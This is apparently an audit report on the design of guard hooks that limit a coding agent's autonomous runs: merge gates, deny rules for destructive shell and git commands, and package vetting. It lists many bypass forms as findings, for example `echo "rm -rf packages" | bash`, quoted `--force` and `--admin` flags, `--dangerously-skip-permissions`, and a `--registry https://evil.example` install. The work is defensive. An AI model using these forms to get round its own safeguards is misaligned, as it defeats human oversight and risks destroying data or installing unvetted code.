- **Improvable.** Ticket Alcance 2 says "`rm` libre dentro del scratchpad", while AC1 and the spec say the hook returns *no decision*. Align the ticket wording.
- **Improvable.** Proposal Impact line 38 says `sdd-harness.env` is "edited by hand by the author". D18 and task 2.2 say the agent edits it with the Edit tool and you confirm. Fix the proposal.

## 2. Inherited acceptance criteria (the ticket's own ACs)

| AC | Requirement / scenario | State |
|---|---|---|
| 1 | Manual switch, two switch-off scenarios | Covered, but three always-on changes are not declared: B-1 (stack guard / substitutions), B-2, B-6. **Blocking** through those findings |
| 2 | No pending ask | Covered. The "even when jq is missing" clause is unreachable (B-8) |
| 3 | Deterministic merge | Covered. Gaps B-3 and B-4 |
| 4 | Vetted installs | Covered |
| 5 | "los `.env` reales y `secrets/` siguen denegados" | **Blocking (B-9).** No requirement or scenario mentions `secrets/`. Add `secrets/api.key` to the requirement and to "Real environment files stay denied" |
| 6 | Cursor format | Covered |
| 7 | Preflight fails in both shells | Covered (10.3, 12.6) |
| 8 | Merge dry run under the profile | 12.4. Manual, no scenario needed |

## 3. Missing scenarios (improvable)

- **"Dependency installs…":**
  - "Installs without a package name (`npm install`, `npm ci`) are not affected";
  - "Outside an autonomous run a recognised install asks".

  Both are unnamed tests in 4.1; make them scenarios.
- **"Rewrites…":** the `tasks.md` / `reports/` / `openspec/templates/` "no decision" row is only an unnamed test in 5.1.
- **"The shell guard ignores text…":** the write targets `mv` and `perl -i` are in the requirement but not in the scenario.
- **"The shell guard ignores text…", commit form:** add Claude Code's usual commit form, `git commit -m "$(cat <<'EOF' … git push --force … EOF)"`, which must get no decision.
- **"Cursor runs the same hooks…":** add a shell `ask` outside an autonomous run (`git reset --hard` → `permission: "ask"`).
- **"A preflight…":** add scenarios for:
  - `gh` not authenticated;
  - a red (or in-progress) latest base CI run;
  - a missing `.cursor/hooks.json`;
  - an unregistered merge gate.

## 4. Ambiguity

None of fast/easy/secure/efficient/many/appropriate/robust appears ("small" and "as many files as" are descriptive). Clean.

- **Improvable wording.** The rewrite requirement and its scenarios say the report "ends in an `APPROVED` verdict". Base-standards §7.1 step 2 puts the verdict at the *top* of the report, and appended runs put later verdicts further down. The rule actually defined is "the last line that is exactly `APPROVED` or `CHANGES REQUIRED`". Use "whose latest verdict line is `APPROVED`" throughout.

## 5. Open decisions (each blocking)

- **B-7. Verdict line comparison.**
  - "Exactly `APPROVED`" breaks on reports written with CRLF line endings. The Write tool creates CRLF files in this repo, which is a known local gotcha.
  - It also breaks on trailing spaces.
  - Fix in the requirement and D9: strip a trailing `\r` and trailing whitespace before comparing.
  - Add a test with a CRLF report (5.1).
- **B-8. jq missing in an autonomous run.**
  - Every hook reads its input through `field()`, which returns empty without jq (`lib.sh:94-97`). Each hook then exits 0 at its first guard: `block-dangerous-bash.sh:9`, `protect-specs-and-tests.sh:12`, and so on.
  - So `ask()` is never reached, and the requirement "no hook returns `ask` even when `jq` is missing" is satisfied only because **every protection is off**.
  - The 2.3 test cannot run a real hook into that path, although D15 says tests run the real hook scripts.
  - Fix in the requirement, D2 and `lib.sh`: in an autonomous run, a PreToolUse hook that has no jq denies (exit 2, "jq is required in an autonomous run").
  - Make `jq` a `FAIL` check under `doctor --autonomous`.
  - Rewrite the 2.3 test to run `block-dangerous-bash` with jq hidden.

## 6. Contradictions inside the change

- **B-10, blocking (QB).**
  - Proposal line 20: "the doctrine that requires … a human-written 'why' is relaxed".
  - D16: "rule 8: … → no change".
- **B-11, blocking (QA).**
  - The spec's autonomous-run definition includes Cursor background agents.
  - D16 and the proposal limit the doctrine relaxation, including the agent merge, to `KIT_AUTONOMOUS_RUN="1"`.
- **Improvable.** D16 lists "§3 rules 3–4" and then "§88, §90", which are base-standards rules 2 and 3 by line number. Rule 3 is listed twice under two labels. Name them as rules 2, 3, 4 and 9 (and rule 8 per QB).

## 7. Contradictions with the project

- **B-6, blocking (AC1).**
  - D8 says "`protect-specs-and-tests.sh` reuses `is_secret_path` for its env-file deny", and task 5.3 makes it so.
  - Today that hook has its own narrow case (`protect-specs-and-tests.sh:24-29`: `*.env|*.env.*|*/.env|.env`). So the claim is wrong about the current code.
  - Switching to `is_secret_path` (`lib.sh:180-196`) also denies, always on, edits of:
    - `.npmrc`;
    - `credentials.*`;
    - `secrets/*`;
    - `id_rsa`;
    - `google-services.json`;
    - `service-account*.json`.
  - That changes switch-off behaviour, and it is not one of the AC1 exceptions.
  - Fix in D8 and 5.3: keep the hook's own case and add an `*.env.example|*.env.sample` arm before `*.env.*`. Or ask the author to add the widening to AC1.
- **Improvable.** The 2026-10-16 ADR relation is now stated (D16). Clean otherwise. No main spec under `openspec/specs/` is touched or duplicated.

## 8. Contrast with the real code

- **B-1, blocking. Literal stripping deletes executed text.**
  - D6 step 3 empties double-quoted strings, and step 2 removes *every* heredoc body.
  - But `$(…)` and backticks inside double quotes, and inside unquoted heredocs (`<<EOF`), **are executed**. So `git commit -m "$(rm -rf packages)"` and `cat <<EOF > x` with a body line `$(rm -rf packages)` would get no decision. Today rule 1 denies both, which is an AC1 regression.
  - The same hole bypasses the merge gate: `echo "$(gh pr merge 61 --admin)"` is not detected.
  - Fix in the requirement and D6:
    - keep the contents of `$(…)` and backticks inside double quotes;
    - strip a heredoc body only when its delimiter is quoted (`<<'EOF'`, `<<"EOF"`); an unquoted heredoc body loses only its literal text, not its substitutions.
  - Add scenarios: `git commit -m "$(rm -rf packages)"` → `deny`; `echo "$(gh pr merge 61 --admin)"` → gated.
- **B-2, blocking. The stack guard loses its SQL arm.**
  - `sdd-harness.env:39`'s `GUARD_DANGEROUS_CMD` includes `DROP[[:space:]]+(DATABASE|TABLE|SCHEMA)`. That text only ever appears quoted: `psql -c "DROP TABLE x"`, `docker compose exec db psql -c "…"`.
  - Tasks 3.2 and D6 match rule 7 on the stripped text, and `psql`/`mysql`/`sqlite3` are not in the interpreter list. So the guard that asks today would return no decision, which is an AC1 regression.
  - Fix: rule 7 matches the **original** text (a project-defined pattern). Alternatively, add `psql -c`, `mysql -e`, `sqlite3` and `docker … exec` to the interpreter list.
  - Add a scenario: `psql -c "DROP TABLE x"` asks with the switch off and is denied in an autonomous run.
- **B-3, blocking. The merge gate may query a different repository from the one the merge hits.**
  - D4 runs `gh pr view <selector>` from the hook's working directory, and passes only `-R` through.
  - Two cases mismatch:
    - after a `cd` into another clone (Claude Code's Bash tool keeps `cwd`; the DIS-103 clean-clone flow works in the scratchpad), `gh pr merge 61 --merge` merges PR 61 of *that* repo while the gate checks PR 61 of this one;
    - with `GH_REPO=other/repo gh pr merge 61 --merge`, which the spec explicitly admits ("environment assignments precede it"), the query also targets the wrong repo.
  - Fix in D4 and the requirement:
    - run the query in the input's `cwd` (Claude Code and Cursor's `beforeShellExecution` both send it);
    - deny any `GH_*` assignment before `gh` in an autonomous run;
    - add a test: the command's `cwd` is a different repo and the shim is called from that `cwd`.
- **B-4, blocking. Chaining detection.**
  - D4 lists `;`, `&&`, `||`, `|`, `$(` and backtick. It misses a **newline** and a single `&`.
  - So two `gh pr merge` lines in one command (the second with `--admin`) slip through.
  - Fix in D4, the spec ("chained, piped, backgrounded, on another line or substituted") and the "command form" scenario.
- **B-5, blocking. Rule 8 enumerates forms instead of protecting the property.**
  - The rule's stated purpose is that no git command may revert the local `.claude/sdd-harness.env` or touch kit files. These forms still do:
    - `git add .claude`, `git restore .claude` and `git checkout HEAD -- .cursor`: no trailing slash, so neither "starts with `.claude/`" nor "contains `/.claude/`" matches;
    - `git stash push -- .` (a path list, so it is not denied);
    - `git checkout HEAD -- .`, `git restore --source=HEAD .` and `git restore -W .` (forms not listed);
    - `git checkout -f <branch>`, `git switch -f` and `--discard-changes` (they discard local changes);
    - `git add :/` and `git add ':(top)'`.
  - Fix in D5 and the requirement:
    - a pathspec counts as kit config when a component is `.claude` or `.cursor` (`(^|/)\.(claude|cursor)(/|$)`);
    - a revert (`restore`, `checkout`, `stash`) is denied when its pathspec is absent, `.`, `:/`, `:(top)`, or covers `.claude/`;
    - `checkout`/`switch` with `-f`/`--force`/`--discard-changes` are denied.
  - Add cases to 3.4.
- **B-12, blocking. The profile template's narrow allow opens a classifier bypass.**
  - D12's `Bash(claude -p --agent *)` matches `claude -p --agent x --dangerously-skip-permissions` and `--permission-mode bypassPermissions`. Either one starts a subprocess that skips the auto-mode classifier.
  - Fix in D12 and 10.2:
    - the template also denies `Bash(*--dangerously-skip-permissions*)` and `Bash(*bypassPermissions*)`, or rule 8 denies them in an autonomous run;
    - the 10.2 template test asserts those denies.
- **B-13, blocking (QC).** Edit-tool tampering of the hooks, as above.
- **Improvable.**
  - **Flags that take a value in install detection.** D3 lists only `-w`, `--workspace`, `--filter`, `--prefix` and `--registry`.
    - Today `npm install --omit dev` and `pip install -r requirements.txt` get no decision (`block-dangerous-bash.sh:36`).
    - With tokenisation they would ask with the switch off, and be denied in an autonomous run as a "package without a version".
    - Add `--omit`, `--include`, `--tag`, `--cache`, `--loglevel`, `--userconfig`, `-C`/`--dir`, `--cwd`, and for pip `-r`/`-c`/`--requirement`.
  - **Exact version.** Define "exact version" as `MAJOR.MINOR.PATCH[-prerelease][+build]` in the requirement, since a test will pin it.
  - **`npx`, `npm exec`, `pnpm dlx`, `yarn dlx`, `bunx`.** They download and execute a package without vetting. Either deny them in an autonomous run, or record the risk in the design's Risks section.
  - **Tests created on the branch.** A test the branch creates becomes "existing" right after its RED step. In an autonomous run, later GREEN/REFACTOR edits are denied unless `tasks.md` names the file. Either state in the workflow contract (13.2, `20-openspec.mdc`) that `tasks.md` names every test file it creates, or allow files added on the branch since the merge base.
  - **Test path match.** `grep -F` of the test path matches substrings (`a.spec.ts` inside `a.spec.ts.snap`). Match the path as a whole token.
  - **Self-attested verdict.** The APPROVED verdict is written by the same agent session that saves the report. Add this to the Risks section.
  - **Merge selector.** D4: the selector can also be a branch name, and `-R`/`--repo` may also come *after* `merge`. State both.
  - **Cursor timeouts.** `.cursor/hooks.json`: give every entry an explicit timeout that mirrors `.claude/settings.json`: `stop` 600 s (`verify-tests`), `afterFileEdit` 180/20 s.
  - **Cursor input helper.** D11: list the hooks that switch from `field … '.tool_input.file_path'` / `'.tool_input.command'` to the new helper: `block-dangerous-bash`, `docs-gate`, `protect-specs-and-tests`, `spec-audit-gate`, `block-secret-reads`, `post-edit-quality`, `validate-tasks`, `autonomous-merge-gate`.
  - **Preflight command.** D13: `claude auto-mode config` is not among the dated facts in the design's Context section. Verify it in 10.1.
  - **In-progress base CI.** State whether a latest base run that is still in progress (empty `conclusion`) is `FAIL` or `WARN`.
  - **Doctor file check.** The doctor should also check that `.claude/hooks/vet-package.mjs` exists. The `HOOKS` loop only checks `.sh` files.
  - **Stryker.** `vitest.stryker.config.ts:16-27` does not exclude `tests/harness`, so the 11.2 "check" is already answered. Make it an edit in 4.x or 11.2.
- Confirmed against the code: `spec-audit-gate.sh:25-48`, `doctor.sh:9-11`, `doctor.sh:51` and `doctor.sh:115`, `session-context.sh:9` and `verify-tests.sh:9` match what the design cites.

## 9. Task size

Clean after run 1's splits. **Improvable:** once B-1, B-2 and B-5 are applied, 3.2 grows: substitution-aware stripping, the rule rewiring, rule 7 on the original text. Split it into 3.2a `strip_literals()` with its own unit cases, and 3.2b the rule rewiring.

## 10. Mandatory steps

- Step 0 is first and creates the branch. 0.1 is Linear-first, by your rule.
- 11 (tests, MANDATORY), 12 (MANDATORY, AGENT MUST EXECUTE), 13 and 14 (last; archive before merge; you merge) are present and labelled.
- The report paths follow the patterns. Restoration is in 12.3, 12.4 and 12.7. E2E is stated as not applicable (11.4).

Clean.

## 11. Traceability

| Requirement | Scenarios | Tasks |
|---|---|---|
| Manual switch, default intact | 4 | 0.4, 2.1, 2.2, 9.4 |
| No pending ask | 4 | 2.3, 2.4 |
| Vetted installs | 6 | 4.1, 4.2 |
| Rewrites of specs/tests/doctrine | 9 | 5.1, 5.2 |
| Deterministic merge | 7 | 6.1, 6.2, 12.4 |
| Kit config / local switch out of git | 4 | 3.4 |
| Shell guard ignores literals | 4 | 3.1, 3.2 |
| Scratchpad removals | 3 | 3.3 |
| Example env files | 2 | 5.3, 5.4 |
| Secret allowlist | 3 | 7.1 |
| Denial log | 4 | 7.2 |
| Cursor parity | 7 | 9.1–9.5, 12.5 |
| Preflight | 5 | 10.3–10.5, 12.6 |
| Inline review skills | 2 | 8.1, 8.2 |

No empty row. The scenarios B-1, B-2, B-5, B-7 and B-9 call for must be added to the tasks listed there (3.1, 3.4, 5.1, 5.3).

---

## Corrections to apply

**`specs/agent-harness/spec.md`**
- **"Manual switch…":** after QA, either keep the definition and state it is the scope of every relaxation, or add "the merge gate and the git rule additionally require `KIT_AUTONOMOUS_RUN="1"`". Add "the stack guard pattern is matched on the full command text" to the always-on clarifications (B-2).
- **"No hook leaves a confirmation pending…":** replace "even when `jq` is missing" with "When `jq` is missing in an autonomous run, every hook that decides on a tool call SHALL deny with a reason that names `jq`" (B-8).
- **"Dependency installs…":**
  - define "exact version" as `MAJOR.MINOR.PATCH` with optional pre-release and build;
  - list the value-taking flags;
  - promote the `npm ci` / switch-off-asks tests to scenarios;
  - optionally deny `npx`/`dlx`/`bunx` in an autonomous run.
- **"Rewrites…":**
  - "the latest verdict line … compared after removing a trailing carriage return and whitespace" (B-7), and replace "ends in" with "whose latest verdict is";
  - add a scenario "A CRLF report with `APPROVED` is approved";
  - add the `tasks.md`/`reports/`/`templates/` scenario;
  - after QC, add the row "a file under `.claude/` or `.cursor/`: `deny`".
- **"The agent merges…":**
  - "chained, piped, backgrounded (`&`), on another line, or substituted" (B-4);
  - "the GitHub state is read for the repository of the command's working directory; an environment assignment of a `GH_*` variable before `gh` is denied" (B-3);
  - the selector can be a number, a URL or a branch;
  - add scenarios: a two-line command with two merges → `deny`; `GH_REPO=o/r gh pr merge 61 --merge` → `deny`; `echo "$(gh pr merge 61 --admin)"` → `deny`.
- **"The kit configuration and the local switch…":** restate by property (B-5): a pathspec with a `.claude` or `.cursor` component; reverts whose pathspec is absent, `.`, `:/`, `:(top)` or covers `.claude/`; `checkout`/`switch` with `-f`, `--force` or `--discard-changes`. Add scenarios `git add .claude`, `git stash push -- .` and `git checkout -f main` → `deny`.
- **"The shell guard ignores text…":**
  - "the contents of command substitutions (`$(…)`, backticks) inside double quotes and inside heredocs with an unquoted delimiter are executed and SHALL be matched" (B-1);
  - add `psql`/`mysql`/`sqlite3` and `docker … exec` to the interpreter list, or keep rule 7 on the raw text (B-2);
  - add scenarios:
    - `git commit -m "$(rm -rf packages)"` → `deny`;
    - `psql -c "DROP TABLE x"` → `ask` (switch off);
    - the `git commit -m "$(cat <<'EOF' …)"` form → no decision;
  - add `mv` and `perl -i` to the write-target scenario.
- **"Example environment files…":** "Every other `.env` file, and the files under `secrets/`, SHALL stay denied"; add `secrets/api.key` to "Real environment files stay denied" (B-9).
- **"Cursor runs the same hooks…":** add the scenario: Cursor shell `git reset --hard` with the switch off → `permission: "ask"`.
- **"A preflight…":**
  - add "`jq` is installed" to the autonomous checks (B-8);
  - add scenarios for `gh` not authenticated, a red or in-progress base CI, and a missing `.cursor/hooks.json`.

**`design.md`**
- **D2:** jq-missing behaviour in an autonomous run (deny, exit 2) in `lib.sh`, reached before the hooks' "empty input → exit 0".
- **D3:**
  - complete the value-taking flag list;
  - define the exact-version regex;
  - `npx`/`dlx`/`bunx`: denied in an autonomous run, or a Risks entry.
- **D4:**
  - query in the input `cwd`;
  - `GH_*` assignments denied;
  - newline and `&` as separators;
  - more than one merge invocation → `deny`;
  - selector forms;
  - `-R` in either position.
- **D5:** rewrite rule 8 by property (B-5).
- **D6:** substitution-aware stripping, and quoted versus unquoted heredoc delimiters (B-1). Rule 7 matches the original text, or the interpreter list gains `psql`, `mysql`, `sqlite3` and `docker … exec` (B-2).
- **D8:** remove "reuses `is_secret_path`". `protect-specs-and-tests.sh` keeps its own case at lines 24–29 and gains an `*.env.example|*.env.sample` arm before `*.env.*` (B-6).
- **D9:**
  - verdict comparison strips `\r` and trailing whitespace (B-7);
  - the test path is matched as a whole token;
  - Risks: the verdict is self-attested;
  - the workflow contract requires `tasks.md` to name every test file a task creates (or allow files added on the branch).
- **D11:**
  - list of hooks switching to the input helper;
  - explicit Cursor timeouts for every event (`stop` 600 s, `afterFileEdit` as in `settings.json`).
- **D12:** template denies `--dangerously-skip-permissions` and `bypassPermissions` (B-12).
- **D13:**
  - `jq` is `FAIL` under `--autonomous`;
  - `vet-package.mjs` present;
  - in-progress CI is `FAIL` (or `WARN`);
  - `claude auto-mode config` verified in 10.1.
- **D15:** "`tests/harness` is excluded in `vitest.stryker.config.ts`" (already known: it is not excluded today).
- **D16:**
  - use rule numbers (2, 3, 4, 9, and 8 per QB) instead of "§88/§90";
  - align the relaxation scope with QA;
  - state the autonomous-run rule for the "why" (QB).

**`tasks.md`**
- 2.3: the jq test runs `block-dangerous-bash` with jq hidden and expects exit 2 (B-8).
- 3.1: add the substitution, `psql`, `mv`/`perl -i` and `$(cat <<'EOF')` cases.
- 3.2: split it into 3.2a `strip_literals()` and 3.2b the rule rewiring, with rule 7 on the raw text.
- 3.4: add `git add .claude`, `git stash push -- .`, `git checkout HEAD -- .`, `git checkout -f main` and `git add :/`.
- 4.1: add `npm install --omit dev` (no decision), `pip install -r requirements.txt` (switch off: no decision) and a pre-release version case.
- 5.1: add a CRLF APPROVED report case and the "`tasks.md` names `a.spec.ts.snap` only" case. After QC, add an Edit of `.claude/hooks/lib.sh` → `deny`.
- 5.3: keep the narrow case in `protect-specs-and-tests.sh` (B-6); add `secrets/api.key` read → `deny`.
- 6.1: add the `cwd`, `GH_REPO`, newline and second-merge cases.
- 9.4: Cursor timeouts in `hooks.json`.
- 10.2: the template test asserts the bypass denies (B-12).
- 10.3/10.4: the `jq` check; the `vet-package.mjs` check.
- 11.2: "exclude `tests/harness` in `vitest.stryker.config.ts`" (make it an edit).
- 13.2: the "why" rule (QB), the scope of the relaxation (QA), and the `tasks.md` test-naming rule.

**`proposal.md`**
- Line 20: align with QB and QA.
- Impact, line 38: "`.claude/sdd-harness.env` (new keys, added through the Edit tool with the author's confirmation, D18)".

**Linear DIS-106.** Enhanced part only; the `[original]` block is not touched; all text in Spanish.
- In «Alcance» 2, replace "`rm` libre dentro del scratchpad" with «`rm` dentro del scratchpad: el hook no decide (sigue el flujo normal de permisos)».
- In «Criterios de aceptación» 5, keep the wording; the spec gains `secrets/`.
- Under «Respuestas a la auditoría de la spec», add the answers to QA, QB and QC once given, for example:
  - «QA: un agente de fondo de Cursor con el interruptor a "0" …»;
  - «QB: en modo autónomo el «por qué» de PRs y ADRs lo escribe …»;
  - «QC: en modo autónomo, las ediciones de `.claude/` y `.cursor/` …».
- If QC is accepted, in «Alcance» 2 add: «con el interruptor activo también se deniegan las ediciones (Edit/Write y escrituras de shell) de ficheros bajo `.claude/` y `.cursor/`».

Relevant paths:
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\openspec\changes\autonomous-run-switch\proposal.md
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\openspec\changes\autonomous-run-switch\design.md
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\openspec\changes\autonomous-run-switch\specs\agent-harness\spec.md
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\openspec\changes\autonomous-run-switch\tasks.md
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\openspec\changes\autonomous-run-switch\reports\2026-10-20-spec-audit.md
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\.claude\hooks\lib.sh (lines 94–97, 118–122, 180–196)
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\.claude\hooks\block-dangerous-bash.sh (lines 9, 36, 47–50)
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\.claude\hooks\protect-specs-and-tests.sh (lines 12, 24–29)
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\.claude\sdd-harness.env (line 39)
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\vitest.stryker.config.ts (lines 16–27)
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\docs\base-standards.md (§3 rules 2, 3, 4, 8, 9; §7.1)
- C:\Users\cristina\Desktop\AI4Dev\00-TFM\Codemind\docs\adr\20261016-autonomous-workflow-run-entrega-2.md

### Resolution of run 2 (main session, 2026-10-20)

Author's answers (DIS-106 Enhanced):
- **QA** — merge only with `"1"`. The spec now defines two modes:
  - *unattended* (switch `"1"` or a Cursor background agent): no hook asks;
  - *autonomous run* (switch `"1"` only): merge, doctrine relaxations, kit-configuration protections.

  A background agent with `"0"` gets every merge denied, naming `KIT_AUTONOMOUS_RUN`. Changed: the spec's first requirement, merge requirement, rewrites requirement; D1, D4, D9, D16; the proposal.
- **QB** — the agent writes and marks the "why" in an autonomous run. Rule 8 is listed as relaxed in D16, the proposal, task 9.5 and task 13.2.
- **QC** — edits of `.claude/` and `.cursor/` are denied in an autonomous run, through the editing tools and shell writes (D5; spec "The kit configuration and the local switch stay untouched…"; tasks 3.4 and 5.1).

Findings:
- B-1 fixed: substitution-aware `strip_literals()`, with quoted and unquoted heredocs (D6; spec; scenarios with `$(rm -rf packages)` and the quoted-heredoc commit form; tasks 3.1, 3.2a).
- B-2 fixed: rule 7 matches the original text (D6; spec; `psql -c "DROP TABLE x"` in the switch-off and unattended scenarios).
- B-3 fixed: the query runs in the input `cwd` and `GH_*` assignments are denied (D4; spec; scenario "The state is read where the command runs").
- B-4 fixed: a newline, a single `&`, and more than one merge invocation are denied (D4; spec scenarios).
- B-5 fixed: rule 8 works by property — a `.claude`/`.cursor` component, reverts with no path or with `.`, `:/` or `:(top)`, forced checkout or switch (D5; spec; 3.4).
- B-6 fixed: `protect-specs-and-tests.sh` keeps its own env case and gains an example arm (D8; 5.3, with a test that `.npmrc` and `credentials.json` edits are unchanged).
- B-7 fixed: the verdict reader strips CR and whitespace (spec; D9; CRLF scenario).
- B-8 fixed: a missing jq denies in unattended mode (D2; spec scenario; 2.3); jq is a `FAIL` in the preflight (D13).
- B-9 fixed: `secrets/` stays denied (spec; scenario with `secrets/api.key`).
- B-10 and B-11 fixed: QB and QA.
- B-12 fixed: the profile template denies the bypass flags (D12; test in 10.2).
- B-13 fixed: QC.

Improvables, all fixed:
- value-taking flags, the exact-version regex, and `npx`/`dlx`/`bunx` denied (spec; D3);
- the `npm ci` and switch-off-ask scenarios;
- the templates/tasks/reports scenario;
- `mv` and `perl -i` in the write scenario;
- the Cursor shell-ask scenario;
- the preflight scenarios for GitHub and missing hooks;
- "latest verdict" wording;
- D16 by rule number (2, 3, 4, 8, 9);
- tests created on the branch are allowed (merge-base check, D9);
- whole-path match;
- the self-attested verdict in Risks;
- selector forms and `-R` in either position;
- explicit Cursor timeouts;
- the list of hooks switching to the input helper;
- `claude auto-mode config` checked in 10.1;
- an in-progress base run is `FAIL`;
- the `vet-package.mjs` check;
- the Stryker exclusion is an edit in 1.1;
- 3.2 split into 3.2a and 3.2b;
- the ticket's scratchpad wording;
- the proposal's Impact line on `sdd-harness.env`.

Next: run 3 of the auditor.

## Run 3 (2026-10-20, spec-auditor)

CHANGES REQUIRED

**Questions for the author** (none of them blocks the fixes below):
- **QD. Where "kit configuration" applies.** The spec defines kit configuration as any path with a `.claude` or `.cursor` component (spec, "The kit configuration and the local switch stay untouched…"; D5). That also covers paths outside the repository, which has two consequences:
  - In an autonomous run it denies writes to `~/.claude/…` (auto-memory, plan files). The auditor believes Claude Code's worktree isolation creates worktrees under `<repo>/.claude/worktrees/`; if so, every edit inside such a worktree is denied too. Verify this in 10.1.
  - It does **not** protect a profile directory named, for example, `~/.claude-autonomous` (`CLAUDE_CONFIG_DIR`). The agent could edit its own permissions file there.
  - Options: (a) keep "any path" and also protect `$CLAUDE_CONFIG_DIR`, documenting that autonomous runs use no worktrees and no auto-memory; or (b) limit the rule to repository-relative paths (after the D9 normalisation) and protect `$CLAUDE_CONFIG_DIR` explicitly.

Not re-raised: Q1–Q6, QA, QB, QC.

### Verification of run 2's resolution

| Run 2 item | Claimed | Verified |
|---|---|---|
| QA (two modes) | fixed | Yes: spec req. 1, D1, D4, D9 (Scope), D16, proposal lines 7–9 and 22, ticket. One leftover in D9 «Order» (point 6) |
| QB (agent writes the "why") | fixed | Yes: D16 rule 8, proposal line 26, tasks 9.5 and 13.2 |
| QC (edits of `.claude/` and `.cursor/`) | fixed | Yes: D5, spec, 3.4, 5.1, ticket. Scope question QD |
| B-1 (substitutions kept) | fixed | Yes: D6 and two spec scenarios. But the stripping now hides **quoted arguments** (N1) |
| B-2 (rule 7 on the original text) | fixed | Yes: D6, spec line 350, `psql` in two scenarios, 3.2b |
| B-3 (query in `cwd`, `GH_*` assignments) | fixed | Yes |
| B-4 (newline, `&`, a second merge) | fixed | Yes |
| B-5 (rule 8 by property) | fixed | Yes for unquoted pathspecs. Quoted ones are lost (N1); git glob pathspecs remain open (improvable) |
| B-6 (narrow env case kept) | fixed | Yes: D8, 5.3 (`protect-specs-and-tests.sh:24-29` kept) |
| B-7 (CR-tolerant verdict) | fixed | Yes |
| B-8 (no jq → deny) | fixed | Yes: D2, spec, 2.3, D13 |
| B-9 (`secrets/`) | fixed | Yes |
| B-12 (bypass flags denied in the profile) | fixed | Yes: D12, 10.2 |
| Improvables of run 2 | all fixed | Yes. Each one is in the artifacts |

### 1. Scope against the ticket

DIS-106 has no parent. Everything follows from the Enhanced part and the recorded answers (Q1–Q6, QA–QC). No invented scope.

- **Improvable.** Ticket «Alcance» 4 still says «modo autónomo también con `is_background_agent`». QA defines that case as *unattended*, not autonomous. Reword it.
- **Improvable.** Proposal Non-goals says "denied in an autonomous run". The spec says *unattended mode*. Align it.

### 2. Inherited acceptance criteria (the ticket's own ACs)

| AC | State |
|---|---|
| 1 | Covered by two switch-off scenarios, but **broken by N1 and N2**. With the switch `"0"`, `sed -i 's/1/0/' ".claude/sdd-harness.env"`, `git push "--force"` and `echo "rm -rf packages" \| bash` are denied today and would get no decision. **Blocking** through N1 and N2 |
| 2 | Covered |
| 3 | Covered, but the flag and selector checks are bypassed by quoting (N1). **Blocking** through N1 |
| 4 | Covered, but `--registry` bypasses the vetting (N4). **Blocking** through N4 |
| 5 | Covered (`secrets/api.key`) |
| 6 | Covered. Whether Cursor's edit tool names are complete is open (improvable) |
| 7 | Covered (10.3, 12.6) |
| 8 | 12.4. The profile's merge authorisation names `final-project-CRN`, not the throwaway base (improvable) |

### 3. Missing scenarios

Every requirement's MUST clauses have scenarios. The fixes for N1–N4 need new scenarios, listed under "Corrections to apply". Clean otherwise.

### 4. Ambiguity

- **Improvable.** design.md says "That makes it robust to the CRLF files…". Reword: "A report written with CRLF line endings is read the same as one with LF."

### 5. Open decisions

- **N3, blocking. Where an install's arguments end, and what the vetting `allow` skips.**
  - D3 and the spec tokenise "after the manager and the verb", but never say where the argument list ends.
  - In `npm i left-pad@1.3.0 2>&1`, the token `2>&1` would be read as a package name, so a common form is denied.
  - If tokenising stops at `&&`, then `npm i left-pad@1.3.0 && git add -A` passes vetting. Rule 5's `allow()` then exits the script, so rules 6–8 never run. Cursor has no classifier behind that `allow`.
  - Fix:
    - the argument list ends at a separator or a redirection;
    - in unattended mode a recognised install is allowed only when it is the only command;
    - rule 5's `allow` is emitted only after rules 6–8 have run without a deny.

### 6. Contradictions inside the change

- **Blocking (part of N1).** The spec says the `sdd-harness.env` rule SHALL deny when that file is the write target. D6 makes rule 6 match the *stripped* text, where a quoted target has already been erased.
- **Improvable.** D9 «Order» says "In an autonomous run"; the spec and task 5.2 say unattended mode.
- **Improvable.** The spec says without jq "every hook that decides on a tool call" denies; D2 also includes the prompt hook. Pick one.
- **Improvable.** D8 places the `*.env.example` arm before the secret patterns, so `secrets/x.env.example` becomes readable. State which rule wins.

### 7. Contradictions with the project

- The doctrine relaxations are recorded in D16 by rule number, with the relation to the 2026-10-16 ADR. Doctrine files are not edited. Clean.
- No main spec under `openspec/specs/` is duplicated or contradicted. Clean.
- AC1 regressions: N1 and N2.

### 8. Contrast with the real code

- **N1, blocking. Literal stripping erases quoted *arguments*, not only non-executed text.**
  - Rule 6 (switch off, AC1 regression): `sed -i 's/1/0/' ".claude/sdd-harness.env"` and `printf x > ".claude/sdd-harness.env"` are denied today (`block-dangerous-bash.sh:42-45`) and would get no decision.
  - Rule 3 (switch off, AC1 regression): `git push "--force"` matches today and would not after stripping.
  - Rule 8 (QC bypass): `git add ".claude/settings.json"`, `git restore "."` and `git stash push -- "."` lose their pathspec.
  - Merge gate:
    - `gh pr merge 61 --merge "--admin"` hides `--admin`;
    - `gh pr merge "61" --merge` loses its selector, so the gate checks the current branch's PR;
    - `gh api -X PUT "repos/o/r/pulls/61/merge"` is not detected.
  - D7: quoted scratchpad paths cannot be parsed.
  - Fix:
    - stripped text only for command words and separators;
    - write targets, pathspecs, flags, merge selectors and `rm` targets from the dequoted shell words, per simple command, honouring message options;
    - `gh api` merge patterns (and GraphQL `mergePullRequest`/`enablePullRequestAutoMerge`) on the original text.
- **N2, blocking. The interpreter list misses stdin feeds.** `echo "rm -rf packages" | bash`, `bash <<< "rm -rf packages"` and `echo "gh pr merge 61 --admin" | sh` would be stripped to harmless text. Today rule 1 denies the first two. Fix: cover any listed interpreter that reads its program from stdin (`| bash`, `-s`, `<<<`), option clusters containing `c` and path-prefixed shells.
- **N4, blocking. The vetting can be bypassed with `--registry`.** `npm i left-pad@1.3.0 --registry https://evil.example` vets one package on the public registry and installs another. Fix: in unattended mode, `--registry`/`--userconfig` → `deny`.
- **Improvable.**
  - Git glob pathspecs (`git add '*.env'`) reach `.claude/sdd-harness.env`; deny glob/magic pathspecs in staging and reverts in an autonomous run.
